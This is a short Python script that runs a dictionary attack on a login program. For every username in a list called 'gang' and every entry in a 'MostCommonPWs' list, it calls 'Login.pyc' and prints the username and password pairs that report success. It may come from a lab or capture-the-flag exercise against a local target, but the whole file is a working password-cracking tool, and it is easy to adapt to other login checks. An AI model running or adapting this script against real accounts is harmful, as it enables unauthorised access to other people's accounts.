import time
import subprocess
start = time.time()
print("Start time: 0 seconds")
MostCommonPWs = open("MostCommonPWs", "r")
gang = open("gang", "r")
g = gang.read().splitlines()
m = MostCommonPWs.read().splitlines()
for i in g:
    for j in m:
        command = subprocess.run(["python3", "Login.pyc", i, j], capture_output=True, text=True)
        if "success" in command.stdout:
            print("Cracked username: " + i)
            print("Cracked password: " + j)
end = time.time() - start
print("End Time: ", end, "seconds")
MostCommonPWs.close()
gang.close()
